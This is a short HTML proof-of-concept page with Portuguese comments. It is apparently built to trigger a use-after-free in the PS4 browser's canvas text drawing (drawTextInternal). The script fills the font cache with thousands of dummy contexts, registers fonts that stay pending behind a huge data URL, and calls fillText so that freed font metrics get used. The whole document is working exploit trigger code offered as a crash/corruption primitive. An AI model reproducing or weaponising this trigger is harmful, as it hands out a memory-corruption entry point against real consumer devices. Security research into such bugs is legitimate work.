<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - PS4 fillText / drawTextInternal UAF</title>
</head>
<body>
<script>
    // 1. Satura o cache de fontes para forçar o prune inline no meio do width() chamado por drawTextInternal()
    const dummies = [];
    for (let i = 0; i < 3500; i++) {
        const dummy = document.createElement('canvas').getContext('2d');
        dummy.font = '10px "dummy' + i + '"';
        dummies.push(dummy);
    }

    // 2. URL de fonte pendente grande para manter o estado assíncrono/reentrante
    const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';

    const metricsDonor = new FontFace('metricsDonor', pendingFontURL);
    const measured = new FontFace('measured', pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
    
    document.fonts.add(metricsDonor);
    document.fonts.add(measured);

    const canvas = document.createElement('canvas');
    canvas.width = 200;
    canvas.height = 200;
    const context = canvas.getContext('2d');
    
    context.font = '10px metricsDonor, measured';

    // 3. Dispara fillText (que invoca drawTextInternal no C++ do PS4),
    // forçando a leitura de fontMetrics antes de font.width(), seguida do uso tardio das métricas.
    try {
        context.fillText('\u13A0\u13A2\u13A4', 10, 50);
    } catch (e) {
        console.error(e);
    }
</script>
</body>
</html>
